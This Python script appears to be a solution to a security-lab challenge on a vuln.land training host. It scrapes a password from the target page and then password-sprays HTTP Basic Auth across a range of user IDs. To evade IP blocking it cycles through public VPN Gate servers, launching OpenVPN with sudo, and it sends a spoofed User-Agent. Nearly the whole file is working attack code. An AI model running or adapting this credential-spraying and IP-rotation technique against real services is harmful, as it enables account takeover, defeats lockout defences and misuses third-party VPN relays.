from time import sleep
import requests
from requests.auth import HTTPBasicAuth
from bs4 import BeautifulSoup
import tempfile
import base64
import subprocess
import time
import os
import signal

r = requests.get('https://pwspray.vm.vuln.land/', verify=False)
parsed_html = BeautifulSoup(r.text, features='html5lib')

passwords = parsed_html.find_all('td', class_='column4')

# ssh  ->  user_100000 -> user_100500
# ftp  ->  user_120000 -> user_120500
# http ->  user_140000 -> user_140500
ssh = passwords[0].text
ftp = passwords[1].text
http = passwords[2].text

print('HTTP password:', http)

country = 'japan'

vpn_data = requests.get('http://www.vpngate.net/api/iphone/').text.replace('\r','')
servers = [line.split(',') for line in vpn_data.split('\n')]
labels = servers[1]
labels[0] = labels[0][1:]
servers = [s for s in servers[2:] if len(s) > 1]

desired = [s for s in servers if country.lower() in s[5].lower()]
found = len(desired)
print('Found ' + str(found) + ' servers for country ' + country)

supported = [s for s in desired if len(s[-1]) > 0]
print(str(len(supported)) + ' of these servers support OpenVPN')


found = False
user_id = 140000

# iterating through servers from best to worst
for server in sorted(supported, key=lambda s: float(s[2].replace(',','.')), reverse=True)[0:]:
    #Output server information
    print("\n---- Now connecting to ----")
    pairs = list(zip(labels, server))[:-1]
    for (l, d) in pairs[:4]:
        print(l + ': ' + d)
    print(pairs[4][0] + ': ' + str(float(pairs[4][1]) / 10**6) + ' MBps')
    print("Country: " + pairs[5][1])

    #configure VPN
    _, path = tempfile.mkstemp()

    f = open(path, 'wb')
    f.write(base64.b64decode(server[-1]))
    f.write(b'\nscript-security 2\nup /etc/openvpn/update-resolv-conf\ndown /etc/openvpn/update-resolv-conf')
    f.close()


    time.sleep(2)

    #start VPN process
    pro = subprocess.Popen('sudo ' + 'openvpn ' + '--config ' + path, stdout=subprocess.PIPE, preexec_fn=os.setsid, shell=True)

    time.sleep(20)

    #making requests to server
    for i in range(0,9):
        print('Request:', 'user_' + str(user_id))
        try:
            response = requests.head('http://pwspray.vm.vuln.land/', auth=HTTPBasicAuth('user_' + str(user_id), http), headers={'User-Agent': 'acbdef'}, timeout=18)
            if response.status_code != 401:
                print('Found!')
                print('Username:', 'user_' + str(user_id))
                print('Password:', http)
                found = True
                break
            user_id += 1
        except:
            print("Error! Connecting to new VPN!")
            break

    #Kill VPN connection
    os.killpg(os.getpgid(pro.pid), signal.SIGTERM)
    time.sleep(7)
    print('VPN terminated')

    #check if correct login was found
    if found or user_id > 140500:
        break

print("Finished")